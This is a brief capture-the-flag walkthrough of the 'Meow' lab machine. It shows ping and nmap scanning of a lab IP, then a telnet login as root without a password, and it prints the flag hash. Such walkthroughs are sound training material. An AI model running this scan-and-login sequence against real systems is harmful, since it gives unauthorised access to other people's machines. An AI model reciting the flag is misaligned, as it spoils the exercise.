![Meow.png](/assets/Tier-0/Meow/meow.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.148.116
```



2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.148.116 
```

**Output**
```bash
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63
```

3. Connect with **telnet**
```bash
┌──(root㉿kali)-[/home/kali]
└─| telnet 10.129.148.116
Trying 10.129.148.116...
Connected to 10.129.148.116.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
```
+ In `Meow login: ` write **root**.
+ We do this to access to system without password.


**Output**
```bash
root@Meow:~| ls
flag.txt  snap
```

4. List files of system and read the `flag.txt` file.
```bash
root@Meow:~| cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```



**By: EsT**